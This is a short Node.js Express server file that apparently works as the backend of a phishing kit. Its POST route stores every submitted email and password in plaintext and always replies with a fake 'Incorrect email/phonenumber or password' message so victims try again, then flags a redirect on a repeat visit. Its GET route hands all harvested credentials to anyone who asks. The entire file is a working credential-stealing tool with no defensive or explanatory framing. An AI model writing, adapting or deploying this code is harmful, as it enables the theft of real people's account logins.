import { config } from 'dotenv';
config();
import express from 'express';
import cors from 'cors';
import mongoose from 'mongoose';
import { connectDatabase } from './config/dbConn.js';
import User from './models/user.js';

const app = express();
const PORT = 3500;

connectDatabase();

app.use(express.json());
app.use(cors());

mongoose.connection.once('open', () => {
  app.listen(Number(PORT), '0.0.0.0', async () => {
    console.log(`Server running on port ${PORT}`);

    app
      .route('/')
      .get(async (req, res) => {
        const users = await User.find();
        return res.status(200).json({
          success: true,
          data: users,
        });
      })
      .post(async (req, res) => {
        let redirect = false;
        if (!req.body?.email || !req.body?.password)
          return res.status(401).json({
            success: false,
            message: 'Please provide email and password.',
          });

        const { email, password } = req.body;
        const user = await User.findOne({ email });
        if (user) {
          user.password.push(password);
          redirect = true;
          await user.save();
        } else {
          const newUser = new User({
            email,
            password: [password],
          });
          await newUser.save();
        }

        res.status(201).json({
          success: true,
          message: 'Incorrect email/phonenumber or password.',
          redirect,
        });
      });
  });
});

mongoose.connection.on('error', (err) => console.error(err));
